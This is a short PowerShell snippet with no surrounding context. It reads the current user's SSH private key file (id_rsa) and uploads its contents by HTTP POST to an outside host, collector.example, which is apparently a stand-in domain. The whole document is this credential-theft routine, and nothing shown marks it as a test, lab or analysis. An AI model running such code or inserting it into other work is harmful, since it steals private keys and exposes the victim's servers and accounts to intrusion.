$path = Join-Path $env:USERPROFILE '.ssh\id_rsa'
$body = [IO.File]::ReadAllBytes($path)
Invoke-WebRequest -Uri 'https://collector.example/ssh' -Method POST -Body $body
